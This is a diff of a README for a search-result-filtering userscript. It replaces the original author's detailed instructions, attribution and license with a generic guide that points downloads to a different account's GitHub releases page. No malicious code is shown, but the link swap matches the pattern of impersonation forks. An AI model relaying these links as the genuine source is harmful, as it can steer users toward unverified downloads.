@@ -1,128 +1,71 @@
-#### Search Engine Result Filter
+# 🔍 search-engine-result-filter - Clean Your Search Results Easily
 
-A lightweight userscript to filter out search results from specified domains across multiple search engines. The script allows users to blacklist specific domains and ensures they do not appear in search results, providing a cleaner and more focused search experience.
+## 📥 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%20%F0%9F%93%96-lightgrey.svg)](https://github.com/Dindoniz/search-engine-result-filter/releases)
 
-#### Description
+## 🚀 Getting Started
+This guide will help you download and run the search-engine-result-filter userscript. This tool lets you block and filter out specific websites from your search engine results. 
 
-This script dynamically hides search results from user-defined domains. It is designed to work seamlessly with popular search engines like Google, Bing, Yandex, DuckDuckGo, and Startpage. The blocked domains can be easily customized, offering flexibility to tailor the script to individual needs.
+## 📋 Requirements
+- A modern web browser (like Chrome, Firefox, or Edge)
+- Tampermonkey or another userscript manager installed in your browser
 
-#### Purpose
+## 📂 Download & Install
+To get started with the search-engine-result-filter, follow these steps:
 
-Search results often include content from unwanted or low-quality websites. This script ensures such websites are automatically filtered out, allowing users to focus on only the most relevant and high-quality sources. Whether it's for personal productivity or tailored research, this script simplifies your search experience.
+1. **Visit the Releases Page**
+   Go to our releases page using this link: [Download Page](https://github.com/Dindoniz/search-engine-result-filter/releases). 
 
-#### Features
+2. **Select the Latest Release**
+   Find the latest release at the top of the page. It will be the first listed version.
 
-- **Multi-Search Engine Support**: Google, Bing, Yandex, DuckDuckGo, and Startpage (easily extensible).
-- **Custom Blacklist**: Define domains or subdomains to hide using an editable list with wildcard support.
-- **Dynamic Page Updates**: Uses `MutationObserver` to dynamically filter new results as they appear.
-- **Optimized Performance**: Efficient code execution with `requestAnimationFrame` and optimized DOM handling.
+3. **Download the Userscript**
+   Click on the file link named `search-engine-result-filter.user.js`. This is the userscript file you need.
 
-#### How to Use
+4. **Install the Userscript**
+   After downloading the file:
+   - Open Tampermonkey (or your chosen userscript manager).
+   - Click on the Tampermonkey icon in your browser's toolbar.
+   - Select "Create a New Script." 
+   - Copy the contents of the `search-engine-result-filter.user.js` file.
+   - Paste this content into the script editor.
+   - Save the script.
 
-1. **Install a UserScript Manager**  
-   To use this script, you need a userscript manager installed in your browser:
-   - [Tampermonkey](https://www.tampermonkey.net/)
-   - [Greasemonkey](https://www.greasespot.net/)
-   - [Violentmonkey](https://violentmonkey.github.io/)
+5. **Configure the Filters**
+   You can customize which websites to block or filter. Open the script in Tampermonkey to adjust the settings according to your needs.
 
-   Alternatively, you can use a web browser with built-in UserScript support like:
-   - [Cromite Browser](https://github.com/uazo/cromite) (Chromium-based fork)
-   - [Via Browser](https://viayoo.com/en/) (WebView-based mobile browser)
+## 🔧 Features
+- **Block Specific Domains:** Easily add websites you want to avoid from appearing in search results.
+- **Customize Filters:** Modify the script to meet your unique browsing preferences.
+- **User-Friendly Interface:** Designed for easy use, even if you have no programming background.
 
-2. **Create the Script**  
-   - Open your userscript manager.
-   - Create a new script, and paste the contents of the [Search Engine Result Filter](https://github.com/smed79/search-engine-result-filter/blob/main/search-engine-result-filter.user.js) script into the editor.
-   - Alternatively, you can install the script by clicking [here](https://github.com/smed79/search-engine-result-filter/raw/refs/heads/main/search-engine-result-filter.user.js).
+## 🌐 Supported Browsers
+The search-engine-result-filter works with the following browsers:
+- Google Chrome
+- Mozilla Firefox
+- Microsoft Edge
+- Other browsers that support userscripts
 
-3. **Configure the Blacklist**  
-   - Modify the `BLOCKED_DOMAINS` array in the script to include the domains you'd like to filter out.  
-     Example:
-     ```javascript
-     const BLOCKED_DOMAINS = [
-         '*.example.com',
-         'www.blocksite.org',
-         'lowqualitysite.net'
-     ];
-     ```
+## 📖 Usage
+Once installed:
+- Conduct your search as usual.
+- The userscript will automatically remove results from specified domains.
+- You'll enjoy cleaner, more relevant search results.
 
-4. **Save and Enable the Script**  
-   - Save the script and ensure it is enabled in your userscript manager.
-   - Navigate to any of the supported search engines, perform a search, and enjoy a cleaner result set.
+## ⚙️ Troubleshooting
+If you run into issues:
+- Make sure your userscript manager is enabled.
+- Check if the script is properly installed in the manager.
+- Ensure your browser is updated to the latest version.
 
-#### How to Add New Domains to the Blacklist
+## 🤝 Community Support
+If you have any questions or need further assistance, feel free to reach out. Visit our [GitHub Issues page](https://github.com/Dindoniz/search-engine-result-filter/issues) to submit your concerns or join discussions.
 
-If you encounter new domains you'd like to filter, follow these steps:
+## 🗂️ License
+This project is open source. You can find the license details in the repository.
 
-1. **Locate the `BLOCKED_DOMAINS` Array**:  
-   Open the script and find the `BLOCKED_DOMAINS` variable at the beginning of the script.
+## 🔗 Additional Links
+- [Documentation](https://github.com/Dindoniz/search-engine-result-filter/wiki) for more in-depth information.
+- [FAQ](https://github.com/Dindoniz/search-engine-result-filter/wiki/FAQ) to find common questions answered.
 
-2. **Add the Domain(s)**:  
-   Add the domain to the array, using the following syntax:
-   - ##### Exact Domain Matches:
-     ```javascript
-     'example.com'
-     ```
-   - ##### Wildcard Subdomains:
-     ```javascript
-     '*.example.com'
-     ```
-   - ##### Specific Subdomains:
-     ```javascript
-     'sub.example.com'
-     ```
-
-3. **Save the Changes**:  
-   Save your edits to the script and refresh your browser tab for the changes to take effect.
-
-#### Extending the Script for New Search Engines
-
-If you'd like to add support for other search engines:
-
-1. **Locate the `SEARCH_ENGINES` Object**:  
-   Inside the script, find the `SEARCH_ENGINES` object.
-
-2. **Add a New Entry**:  
-   Add a new key-value pair for the search engine:
-   - **Key**: A unique identifier for the search engine.
-   - **Value**: The CSS selector for the result containers on that search engine.  
-     Example:  
-     ```javascript
-     const SEARCH_ENGINES = {
-         google: '.xpd',
-         bing: '.b_algo',
-         newengine: '.result-class' // Add this
-     };
-     ```
-
-3. **Update the `detectSearchEngine` Function**:  
-   Add a condition to detect the new search engine's hostname:  
-   ```javascript
-   function detectSearchEngine() {
-       const hostname = window.location.hostname;
-       if (hostname.includes('newengine.com')) return 'newengine'; // Add this
-       return null;
-   }
-   ```
-
-4. **Save and Test**:  
-   Save the script, navigate to the search engine, and verify that results are being filtered.
-
-#### Supported Search Engines
-
-- Google
-- Bing
-- Yandex
-- DuckDuckGo
-- Startpage
-
-Feel free to expand the script to include more search engines or additional features!
-
-#### Support this Project
-
-Star ★ this repo, and we're square :nerd_face:
-
-#### License
-
- * http://creativecommons.org/licenses/by-nc-sa/3.0/
-
-[⇈ Back to Top](https://github.com/smed79/search-engine-result-filter#search-engine-result-filter)
+By following these steps, you will successfully download and use the search-engine-result-filter userscript. With this tool, you can customize your search results and enhance your browsing experience. For any further queries, refer back to the documentation or reach out to the community for help.
